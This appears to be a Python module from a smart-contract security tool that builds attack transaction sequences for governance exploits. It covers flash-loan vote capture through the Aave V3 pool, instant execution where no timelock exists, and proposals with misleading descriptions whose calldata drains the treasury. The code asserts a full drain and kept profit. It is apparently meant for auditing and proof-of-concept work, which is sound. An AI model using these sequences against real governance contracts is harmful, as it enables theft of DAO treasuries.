"""
GovernanceSequenceBuilder — Phase 4.

Converts GOVERNANCE attack hypotheses into transaction sequences.
"""

from __future__ import annotations

from zeropath.adversarial.models import AttackClass, AttackHypothesis
from zeropath.models import ProtocolGraph
from zeropath.sequencer.base import FLASH_LOAN_PROVIDERS, BaseSequenceBuilder
from zeropath.sequencer.models import AttackContext, CallerType, ProfitEstimate, TxCall

_AAVE_V3 = FLASH_LOAN_PROVIDERS["aave_v3"]


class GovernanceSequenceBuilder(BaseSequenceBuilder):
    attack_class = AttackClass.GOVERNANCE

    def _build_calls(
        self, hypothesis: AttackHypothesis, graph: ProtocolGraph
    ) -> list[TxCall]:
        title_lower = hypothesis.title.lower()
        if "flash loan" in title_lower:
            return self._flash_loan_capture(hypothesis)
        if "instant" in title_lower or "timelock" in title_lower:
            return self._instant_execution(hypothesis)
        if "malicious proposal" in title_lower:
            return self._malicious_proposal(hypothesis)
        return self._generic_governance(hypothesis)

    def _flash_loan_capture(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        gov_contract = (hypothesis.contracts_involved or ["Governor"])[0]
        gov_fns = hypothesis.functions_involved or ["vote", "execute"]
        vote_fn = next((f for f in gov_fns if "vote" in f.lower()), "castVote")
        exec_fn = next((f for f in gov_fns if "execute" in f.lower()), "execute")

        return [
            self._call(
                step=1,
                description="Request flash loan of governance tokens",
                target=f"IPool({_AAVE_V3})",
                sig="flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
                calldata="address(this), assets, amounts, modes, address(this), params, 0",
                caller=CallerType.ATTACKER_CONTRACT,
                pre=[
                    "uint256 treasuryBefore = address(TREASURY).balance;",
                    "// Create malicious proposal (drain treasury to attacker)",
                    "bytes memory callData = abi.encodeWithSignature('transfer(address,uint256)', attacker, treasuryBefore);",
                    "uint256 proposalId = governor.propose(targets, values, calldatas, description);",
                ],
                gas=600_000,
            ),
            self._call(
                step=2,
                description=f"[In executeOperation] Vote YES with all flash-loaned tokens via {vote_fn}()",
                target=f"I{gov_contract}(/* Governor address */)",
                sig=f"{vote_fn}(uint256,uint8)",
                calldata="proposalId, 1  // 1 = FOR",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    "// Flash-loaned tokens = supermajority → proposal passes instantly",
                    "(,,,,,,,uint256 forVotes,,) = governor.proposalVotes(proposalId);",
                    "assertGt(forVotes, governor.quorum(block.number - 1), 'Quorum not met');",
                ],
                gas=300_000,
            ),
            self._call(
                step=3,
                description=f"[In executeOperation] Execute proposal immediately via {exec_fn}()",
                target=f"I{gov_contract}(/* Governor address */)",
                sig=f"{exec_fn}(address[],uint256[],bytes[],bytes32)",
                calldata="targets, values, calldatas, descriptionHash",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    "// Treasury drained in same transaction as vote",
                ],
                gas=400_000,
            ),
            self._call(
                step=4,
                description="Repay flash loan; keep drained treasury funds",
                target="IERC20(GOV_TOKEN)",
                sig="transfer(address,uint256)",
                calldata=f"address({_AAVE_V3}), flashAmount + flashFee",
                caller=CallerType.ATTACKER_CONTRACT,
                post=[
                    "uint256 treasuryAfter = address(TREASURY).balance;",
                    "assertEq(treasuryAfter, 0, 'Treasury not fully drained');",
                    "assertGt(address(this).balance, treasuryBefore, 'No profit');",
                ],
                gas=100_000,
            ),
        ]

    def _instant_execution(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        gov_contract = (hypothesis.contracts_involved or ["Governor"])[0]
        gov_fns = hypothesis.functions_involved or ["propose", "vote", "execute"]

        return [
            self._call(
                step=1,
                description="Create malicious governance proposal (drain treasury)",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="propose(address[],uint256[],bytes[],string)",
                calldata="targets, values, calldatas, 'Routine maintenance'",
                caller=CallerType.ATTACKER_EOA,
                pre=["// Attacker must hold enough tokens to meet proposal threshold"],
                gas=300_000,
            ),
            self._call(
                step=2,
                description="Vote to pass (if attacker has voting majority)",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="castVote(uint256,uint8)",
                calldata="proposalId, 1",
                caller=CallerType.ATTACKER_EOA,
                gas=200_000,
            ),
            self._call(
                step=3,
                description="Execute immediately — no timelock delay",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="execute(address[],uint256[],bytes[],bytes32)",
                calldata="targets, values, calldatas, descriptionHash",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertEq(address(TREASURY).balance, 0, 'Treasury not drained');",
                ],
                gas=400_000,
            ),
        ]

    def _malicious_proposal(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        gov_contract = (hypothesis.contracts_involved or ["Governor"])[0]
        return [
            self._call(
                step=1,
                description="Submit proposal with misleading description but malicious calldata",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="propose(address[],uint256[],bytes[],string)",
                calldata="targets, values, maliciousCalldata, 'Emergency protocol update'",
                caller=CallerType.ATTACKER_EOA,
                pre=[
                    "// maliciousCalldata: abi.encodeWithSignature('transfer(address,uint256)', attacker, MAX)",
                    "// Description says 'maintenance' but calldata drains treasury",
                ],
                gas=300_000,
            ),
            self._call(
                step=2,
                description="Wait for voting period and accumulate votes (via bribe market or own tokens)",
                target="/* off-chain: accumulate votes over voting period */",
                sig=None,
                caller=CallerType.ANY_EOA,
                gas=21_000,
            ),
            self._call(
                step=3,
                description="Execute after voting period (exploit timelock if absent)",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="execute(address[],uint256[],bytes[],bytes32)",
                calldata="targets, values, maliciousCalldata, descriptionHash",
                caller=CallerType.ATTACKER_EOA,
                post=[
                    "assertGt(IERC20(TOKEN).balanceOf(address(this)), 0, 'Malicious proposal failed');",
                ],
                gas=400_000,
            ),
        ]

    def _generic_governance(self, hypothesis: AttackHypothesis) -> list[TxCall]:
        gov_contract = (hypothesis.contracts_involved or ["Governor"])[0]
        return [
            self._call(
                step=1,
                description="Exploit governance vulnerability per hypothesis",
                target=f"I{gov_contract}(/* Governor address */)",
                sig="/* TODO: target function */",
                calldata="/* TODO: parameters */",
                caller=CallerType.ATTACKER_EOA,
                gas=400_000,
            ),
        ]

    def _build_context(self, hypothesis, graph) -> AttackContext:
        ctx = super()._build_context(hypothesis, graph)
        ctx.requires_attacker_contract = "flash loan" in hypothesis.title.lower()
        ctx.flash_loan_provider = _AAVE_V3
        return ctx

    def _build_profit_estimate(self, hypothesis) -> ProfitEstimate | None:
        return ProfitEstimate(
            asset="ETH/ERC20",
            min_profit_expression="address(TREASURY).balance",
            max_profit_expression="/* full treasury + protocol TVL */",
            cost_expression="(flashAmount * 9) / 10000",
            scales_with_tvl=True,
            notes="Full treasury/protocol fund capture via malicious governance execution.",
        )
